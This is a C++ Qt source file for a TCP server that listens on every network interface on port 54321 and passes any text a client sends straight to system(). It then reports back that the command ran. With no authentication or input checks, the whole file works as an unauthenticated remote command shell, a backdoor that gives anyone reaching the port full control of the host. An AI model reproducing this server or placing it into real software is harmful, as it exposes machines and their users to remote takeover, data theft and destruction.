#include "server.h"
#include <QNetworkInterface>
#include <QTcpSocket>
#include <QProcess>

Server::Server(QObject* parent)
{
    tcpServer = new QTcpServer(parent);
    connect(tcpServer, SIGNAL(newConnection()), this, SLOT(newConnection()));

}

bool Server::start()
{
    if (!tcpServer->listen(QHostAddress::Any, 54321)) {
        qDebug() << "Couldn't listen";
        return false;
    }
    qDebug() << "Server running";
    return true;
}

void Server::newConnection(){
    if (socket != nullptr){
        socket->close();
    }
    socket = tcpServer->nextPendingConnection();
    connect(socket, SIGNAL(readyRead()), this, SLOT(readFromClient()));
    connect(socket, SIGNAL(disconnected()), this, SLOT(disconnection()));
}

void Server::disconnection()
{
    socket = nullptr;
}

void Server::readFromClient()
{
    QByteArray cmd;
    qint64 size = 0;
    while((size = socket->bytesAvailable())){
        cmd += socket->read(size);
    }
    //QProcess process;
    //process.startDetached(cmd.toStdString().c_str());
    //process.waitForFinished();
    system(qPrintable(cmd.toStdString().c_str()));

    QString output = QString("The command \'") + cmd.toStdString().c_str() + "\' has executed";
    socket->write(output.toStdString().c_str());
    socket->flush();

    socket->waitForBytesWritten(3000);

}

Server::~Server(){
    delete tcpServer;
}
